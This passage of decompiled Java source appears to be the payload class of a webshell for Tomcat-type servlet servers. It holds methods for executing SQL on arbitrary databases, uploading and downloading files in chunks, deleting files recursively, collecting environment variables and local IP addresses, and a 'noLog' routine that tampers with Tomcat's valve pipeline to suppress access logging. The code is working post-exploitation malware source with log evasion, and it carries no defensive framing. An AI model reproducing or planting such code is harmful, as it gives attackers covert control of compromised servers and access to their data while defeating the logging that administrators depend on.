                                data = data + this.base64Encode(String.format("%s", metaData.getColumnName(i + 1))) + "\t";
                            }

                            for(data = data + "\n"; resultSet.next(); data = data + "\n") {
                                for(i = 0; i < columnNum; ++i) {
                                    data = data + this.base64Encode(String.format("%s", resultSet.getString(i + 1))) + "\t";
                                }
                            }

                            resultSet.close();
                            statement.close();
                            dbConn.close();
                            return data.getBytes();
                        }
                    } catch (Exception var25) {
                        return var25.getMessage().getBytes();
                    }
                } else {
                    return ("no " + dbType + " Dbtype").getBytes();
                }
            } catch (Exception var26) {
                return var26.getMessage().getBytes();
            }
        } else {
            return "No parameter dbType,dbHost,dbPort,dbUsername,dbPassword,execType,execSql".getBytes();
        }
    }

    public byte[] close() {
        try {
            if (this.httpSession != null) {
                this.getMethodAndInvoke(this.httpSession, "invalidate", (Class[])null, (Object[])null);
            }

            return "ok".getBytes();
        } catch (Exception var2) {
            return var2.getMessage().getBytes();
        }
    }

    public byte[] bigFileUpload() {
        String fileName = this.get("fileName");
        byte[] fileContents = this.getByteArray("fileContents");
        String position = this.get("position");

        try {
            if (position == null) {
                FileOutputStream fileOutputStream = new FileOutputStream(fileName, true);
                fileOutputStream.write(fileContents);
                fileOutputStream.flush();
                fileOutputStream.close();
            } else {
                RandomAccessFile fileOutputStream = new RandomAccessFile(fileName, "rw");
                fileOutputStream.seek((long)Integer.parseInt(position));
                fileOutputStream.write(fileContents);
                fileOutputStream.close();
            }

            return "ok".getBytes();
        } catch (Exception var5) {
            return String.format("Exception errMsg:%s", var5.getMessage()).getBytes();
        }
    }

    public byte[] bigFileDownload() {
        String fileName = this.get("fileName");
        String mode = this.get("mode");
        String readByteNumString = this.get("readByteNum");
        String positionString = this.get("position");

        try {
            if ("fileSize".equals(mode)) {
                return String.valueOf((new File(fileName)).length()).getBytes();
            } else if ("read".equals(mode)) {
                int position = Integer.valueOf(positionString);
                int readByteNum = Integer.valueOf(readByteNumString);
                byte[] readData = new byte[readByteNum];
                FileInputStream fileInputStream = new FileInputStream(fileName);
                fileInputStream.skip((long)position);
                int readNum = fileInputStream.read(readData);
                fileInputStream.close();
                return readNum == readData.length ? readData : copyOf(readData, readNum);
            } else {
                return "no mode".getBytes();
            }
        } catch (Exception var10) {
            return String.format("Exception errMsg:%s", var10.getMessage()).getBytes();
        }
    }

    public static byte[] copyOf(byte[] original, int newLength) {
        byte[] arrayOfByte = new byte[newLength];
        System.arraycopy(original, 0, arrayOfByte, 0, Math.min(original.length, newLength));
        return arrayOfByte;
    }

    public Map getEnv() {
        try {
            int jreVersion = Integer.parseInt(System.getProperty("java.version").substring(2, 3));
            if (jreVersion >= 5) {
                try {
                    Class var10000 = this.c6;
                    if (var10000 == null) {
                        try {
                            var10000 = Class.forName("java.lang.System");
                        } catch (ClassNotFoundException var7) {
                            throw new NoClassDefFoundError(var7.getMessage());
                        }

                        this.c6 = var10000;
                    }

                    Method method = var10000.getMethod("getenv");
                    if (method != null) {
                        var10000 = method.getReturnType();
                        Class var10001 = this.c7;
                        if (var10001 == null) {
                            try {
                                var10001 = Class.forName("java.util.Map");
                            } catch (ClassNotFoundException var6) {
                                throw new NoClassDefFoundError(var6.getMessage());
                            }

                            this.c7 = var10001;
                        }

                        if (var10000.isAssignableFrom(var10001)) {
                            return (Map)method.invoke((Object)null, (Object[])null);
                        }
                    }

                    return null;
                } catch (Exception var8) {
                    return null;
                }
            } else {
                return null;
            }
        } catch (Exception var9) {
            return null;
        }
    }

    public String getDocBase() {
        try {
            return this.getRealPath();
        } catch (Exception var2) {
            return var2.getMessage();
        }
    }

    public static Connection getConnection(String url, String userName, String password) {
        Connection connection = null;

        try {
            Class var10000 = c8;
            if (var10000 == null) {
                try {
                    var10000 = Class.forName("java.sql.DriverManager");
                } catch (ClassNotFoundException var17) {
                    throw new NoClassDefFoundError(var17.getMessage());
                }

                c8 = var10000;
            }

            Field[] fields = var10000.getDeclaredFields();
            Field field = null;

            for(int i = 0; i < fields.length; ++i) {
                field = fields[i];
                if (field.getName().indexOf("rivers") != -1) {
                    var10000 = c9;
                    if (var10000 == null) {
                        try {
                            var10000 = Class.forName("java.util.List");
                        } catch (ClassNotFoundException var16) {
                            throw new NoClassDefFoundError(var16.getMessage());
                        }

                        c9 = var10000;
                    }

                    if (var10000.isAssignableFrom(field.getType())) {
                        break;
                    }
                }

                field = null;
            }

            if (field != null) {
                field.setAccessible(true);
                List drivers = (List)field.get((Object)null);
                Iterator iterator = drivers.iterator();

                while(iterator.hasNext() && connection == null) {
                    try {
                        Object object = iterator.next();
                        Driver driver = null;
                        var10000 = c10;
                        if (var10000 == null) {
                            try {
                                var10000 = Class.forName("java.sql.Driver");
                            } catch (ClassNotFoundException var15) {
                                throw new NoClassDefFoundError(var15.getMessage());
                            }

                            c10 = var10000;
                        }

                        if (!var10000.isAssignableFrom(object.getClass())) {
                            Field[] driverInfos = object.getClass().getDeclaredFields();

                            for(int i = 0; i < driverInfos.length; ++i) {
                                var10000 = c10;
                                if (var10000 == null) {
                                    try {
                                        var10000 = Class.forName("java.sql.Driver");
                                    } catch (ClassNotFoundException var14) {
                                        throw new NoClassDefFoundError(var14.getMessage());
                                    }

                                    c10 = var10000;
                                }

                                if (var10000.isAssignableFrom(driverInfos[i].getType())) {
                                    driverInfos[i].setAccessible(true);
                                    driver = (Driver)driverInfos[i].get(object);
                                    break;
                                }
                            }
                        }

                        if (driver != null) {
                            Properties properties = new Properties();
                            if (userName != null) {
                                properties.put("user", userName);
                            }

                            if (password != null) {
                                properties.put("password", password);
                            }

                            connection = driver.connect(url, properties);
                        }
                    } catch (Exception var18) {
                    }
                }
            }
        } catch (Exception var19) {
        }

        return connection;
    }

    public static String getLocalIPList() {
        ArrayList ipList = new ArrayList();

        try {
            Enumeration networkInterfaces = NetworkInterface.getNetworkInterfaces();

            while(networkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = (NetworkInterface)networkInterfaces.nextElement();
                Enumeration inetAddresses = networkInterface.getInetAddresses();

                while(inetAddresses.hasMoreElements()) {
                    InetAddress inetAddress = (InetAddress)inetAddresses.nextElement();
                    if (inetAddress != null) {
                        String ip = inetAddress.getHostAddress();
                        ipList.add(ip);
                    }
                }
            }
        } catch (Exception var6) {
        }

        return Arrays.toString(ipList.toArray());
    }

    public String getRealPath() {
        try {
            if (this.servletContext != null) {
                Class var10001 = this.servletContext.getClass();
                Class[] var10003 = new Class[1];
                Class var10006 = this.c2;
                if (var10006 == null) {
                    try {
                        var10006 = Class.forName("java.lang.String");
                    } catch (ClassNotFoundException var6) {
                        throw new NoClassDefFoundError(var6.getMessage());
                    }

                    this.c2 = var10006;
                }

                var10003[0] = var10006;
                Method getRealPathMethod = this.getMethodByClass(var10001, "getRealPath", var10003);
                if (getRealPathMethod != null) {
                    Object retObject = getRealPathMethod.invoke(this.servletContext, "/");
                    return retObject != null ? retObject.toString() : "Null";
                } else {
                    return "no method getRealPathMethod";
                }
            } else {
                return "servletContext is Null";
            }
        } catch (Exception var7) {
            return var7.getMessage();
        }
    }

    public void deleteFiles(File f) throws Exception {
        if (f.isDirectory()) {
            File[] x = f.listFiles();

            for(int i = 0; i < x.length; ++i) {
                File fs = x[i];
                this.deleteFiles(fs);
            }
        }

        f.delete();
    }

    Object invoke(Object obj, String methodName, Object[] parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for(int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object)null);
                    }
                }
            }

            Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[])((Class[])classes.toArray(new Class[0])));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }
    }

    Object getMethodAndInvoke(Object obj, String methodName, Class[] parameterClass, Object[] parameters) {
        try {
            Method method = this.getMethodByClass(obj.getClass(), methodName, parameterClass);
            if (method != null) {
                return method.invoke(obj, parameters);
            }
        } catch (Exception var6) {
        }

        return null;
    }

    Method getMethodByClass(Class cs, String methodName, Class[] parameters) {
        Method method = null;

        while(cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                method.setAccessible(true);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field)obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();

            while(cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }

        f.setAccessible(true);
        return f.get(obj);
    }

    private void noLog(Object servletContext) {
        try {
            Object applicationContext = getFieldValue(servletContext, "context");
            Object container = getFieldValue(applicationContext, "context");

            ArrayList arrayList;
            for(arrayList = new ArrayList(); container != null; container = this.invoke(container, "getParent", (Object[])null)) {
                arrayList.add(container);
            }

            label83:
            for(int i = 0; i < arrayList.size(); ++i) {
                try {
                    Object pipeline = this.invoke(arrayList.get(i), "getPipeline", (Object[])null);
                    if (pipeline != null) {
                        Object valve = this.invoke(pipeline, "getFirst", (Object[])null);

                        while(true) {
                            while(true) {
                                if (valve == null) {
                                    continue label83;
                                }

                                if (this.getMethodByClass(valve.getClass(), "getCondition", (Class[])null) != null) {
                                    Class var10001 = valve.getClass();
                                    Class[] var10003 = new Class[1];
                                    Class var10006 = this.c2;
                                    if (var10006 == null) {
                                        try {
                                            var10006 = Class.forName("java.lang.String");
                                        } catch (ClassNotFoundException var15) {
                                            throw new NoClassDefFoundError(var15.getMessage());
                                        }

                                        this.c2 = var10006;
                                    }

                                    var10003[0] = var10006;
                                    if (this.getMethodByClass(var10001, "setCondition", var10003) != null) {
                                        String condition = (String)this.invoke((String)valve, "getCondition", new Object[0]);
                                        condition = condition == null ? "FuckLog" : condition;
                                        this.invoke(valve, "setCondition", new Object[]{condition});
                                        var10001 = this.servletRequest.getClass();
                                        var10003 = new Class[2];
                                        var10006 = this.c2;
                                        if (var10006 == null) {
                                            try {
                                                var10006 = Class.forName("java.lang.String");
                                            } catch (ClassNotFoundException var14) {
                                                throw new NoClassDefFoundError(var14.getMessage());
                                            }

                                            this.c2 = var10006;
                                        }

                                        var10003[0] = var10006;
                                        var10006 = this.c2;
                                        if (var10006 == null) {
                                            try {
                                                var10006 = Class.forName("java.lang.String");
                                            } catch (ClassNotFoundException var13) {
                                                throw new NoClassDefFoundError(var13.getMessage());
                                            }

                                            this.c2 = var10006;
                                        }

                                        var10003[1] = var10006;
                                        Method setAttributeMethod = this.getMethodByClass(var10001, "setAttribute", var10003);
                                        setAttributeMethod.invoke(condition, condition);
                                        valve = this.invoke(valve, "getNext", (Object[])null);
                                        continue;
                                    }
                                }

                                if (Class.forName("org.apache.catalina.Valve", false, applicationContext.getClass().getClassLoader()).isAssignableFrom(valve.getClass())) {
                                    valve = this.invoke(valve, "getNext", (Object[])null);
                                } else {
                                    valve = null;
                                }
                            }
                        }
                    }
                } catch (Exception var16) {
                }
            }
        } catch (Exception var17) {
        }

    }

    private static Class getClass(String name) {
        try {
            return Class.forName(name);
        } catch (Exception var2) {
            return null;
        }
    }

    public static int bytesToInt(byte[] bytes) {
        int i = bytes[0] & 255 | (bytes[1] & 255) << 8 | (bytes[2] & 255) << 16 | (bytes[3] & 255) << 24;
        return i;
    }

    public String base64Encode(String data) {
        return base64Encode(data.getBytes());
    }

    public static String base64Encode(byte[] src) {
        int off = 0;
        int end = src.length;
        byte[] dst = new byte[4 * ((src.length + 2) / 3)];
        int linemax = -1;
        boolean doPadding = true;
        char[] base64 = toBase64;
        int sp = off;
        int slen = (end - off) / 3 * 3;
        int sl = off + slen;
        if (linemax > 0 && slen > linemax / 4 * 3) {
            slen = linemax / 4 * 3;
        }

        int dp;
        int b0;
        int b1;
        for(dp = 0; sp < sl; sp = b0) {
            b0 = Math.min(sp + slen, sl);
            b1 = sp;

            int bits;
            for(int var14 = dp; b1 < b0; dst[var14++] = (byte)base64[bits & 63]) {
                bits = (src[b1++] & 255) << 16 | (src[b1++] & 255) << 8 | src[b1++] & 255;
                dst[var14++] = (byte)base64[bits >>> 18 & 63];
                dst[var14++] = (byte)base64[bits >>> 12 & 63];
                dst[var14++] = (byte)base64[bits >>> 6 & 63];
            }

            b1 = (b0 - sp) / 3 * 4;
            dp += b1;
        }

        if (sp < end) {
            b0 = src[sp++] & 255;
            dst[dp++] = (byte)base64[b0 >> 2];
            if (sp == end) {
                dst[dp++] = (byte)base64[b0 << 4 & 63];
                if (doPadding) {
                    dst[dp++] = 61;
                    dst[dp++] = 61;
                }
            } else {
                b1 = src[sp++] & 255;
                dst[dp++] = (byte)base64[b0 << 4 & 63 | b1 >> 4];
                dst[dp++] = (byte)base64[b1 << 2 & 63];
                if (doPadding) {
                    dst[dp++] = 61;
                }
            }
        }

        return new String(dst);
    }

    public static byte[] base64Decode(String base64Str) {
        if (base64Str.length() == 0) {
            return new byte[0];
        } else {
            byte[] src = base64Str.getBytes();
            int sp = 0;
            int sl = src.length;
            int paddings = 0;
            int len = sl - sp;
            if (src[sl - 1] == 61) {
                ++paddings;
                if (src[sl - 2] == 61) {
                    ++paddings;
                }
            }

            if (paddings == 0 && (len & 3) != 0) {
                paddings = 4 - (len & 3);
            }

            byte[] dst = new byte[3 * ((len + 3) / 4) - paddings];
            int[] base64 = new int[256];
            Arrays.fill(base64, -1);

            int dp;
            for(dp = 0; dp < toBase64.length; base64[toBase64[dp]] = dp++) {
            }

            base64[61] = -2;
            dp = 0;
            int bits = 0;
            int shiftto = 18;

            while(sp < sl) {
                int b = src[sp++] & 255;
                if ((b = base64[b]) < 0 && b == -2) {
                    if (shiftto == 6 && (sp == sl || src[sp++] != 61) || shiftto == 18) {
                        throw new IllegalArgumentException("Input byte array has wrong 4-byte ending unit");
                    }
                    break;
                }

                bits |= b << shiftto;
                shiftto -= 6;
                if (shiftto < 0) {
                    dst[dp++] = (byte)(bits >> 16);
                    dst[dp++] = (byte)(bits >> 8);
                    dst[dp++] = (byte)bits;
                    shiftto = 18;
                    bits = 0;
                }
            }

            if (shiftto == 6) {
                dst[dp++] = (byte)(bits >> 16);
            } else if (shiftto == 0) {
                dst[dp++] = (byte)(bits >> 16);
                dst[dp++] = (byte)(bits >> 8);
            } else if (shiftto == 12) {
                throw new IllegalArgumentException("Last unit does not have enough valid bits");
            }

            if (dp != dst.length) {
                byte[] arrayOfByte = new byte[dp];
                System.arraycopy(dst, 0, arrayOfByte, 0, Math.min(dst.length, dp));
                dst = arrayOfByte;
            }

            return dst;
        }
    }
}
